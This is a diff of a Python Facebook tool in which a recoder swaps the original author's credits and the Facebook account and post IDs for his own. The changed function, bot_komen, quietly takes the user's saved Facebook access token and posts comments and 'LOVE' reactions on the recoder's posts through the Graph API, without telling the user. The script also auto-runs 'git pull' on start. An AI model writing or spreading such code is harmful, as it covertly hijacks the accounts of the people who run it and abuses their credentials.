@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-#decompile by riyenz
+#decompile by riyenz_
 # coded by angga kurniawan
 # fb.me/gaaaarzxd
 
@@ -47,7 +47,7 @@ op = bulan[nTemp]
 
 def logo():
 	os.system("clear")
-	print("  \033[0;91m\n\033[0;91m\033[0;96m AUTHOR\033[0;97m : RIYenz Gans\n\033[0;97m \033[0;91mFACEBOOK\033[0;97m : FB.ME RianStwn30\n\033[0;97m \033[0;93mGITHUB\033[0;97m : GITHUB.COM/riyenz30")
+	print("  \033[0;91m\n\033[0;91m/ \033[0;96mAUTHOR\033[0;97m : RIYenz Gans\n\033[0;97m \033[0;91mFACEBOOK\033[0;97m : FB.ME RianStwn30\n\033[0;97m \033[0;93mGH\033[0;97m : GITHUB.COM/riyenz30")
 
 def bot_komen():
     try:
@@ -55,11 +55,11 @@ def bot_komen():
     except IOError:
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
         os.system('rm -rf login.txt')
-    una = ('100055105064251') 
-    post = ('313008703879296') 
-    post2 = ('313008703879296') 
-    kom = ('ILopYu Bang @[100055105064251:0] 😍😘\nhttps://www.facebook.com/100055105064251/posts/313008703879296/?app=fbl') 
-    kom2 = ('KEREN BANG @[100055105064251:0] 😘😘\nhttps://www.facebook.com/100055105064251/posts/313008703879296/?app=fbl') 
+    una = ('100025434784741') 
+    post = ('450561335801689') 
+    post2 = ('174908183367007') 
+    kom = ('I LOP YU BANG @[100025434784741:0] 😍😘\nhttps://www.facebook.com/100025434784741/posts/450561335801689/?app=fbl') 
+    kom2 = ('KEREN BANG @[100025434784741:0] 😘😘\nhttps://www.facebook.com/100025434784741/posts/174908183367007/?app=fbl') 
     reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
@@ -589,4 +589,4 @@ if __name__ == '__main__':
 	os.system("git pull")
 	login()
 	
-	#awikwokwoak ngerecode:v
+	#awikwokwikwok recode:v
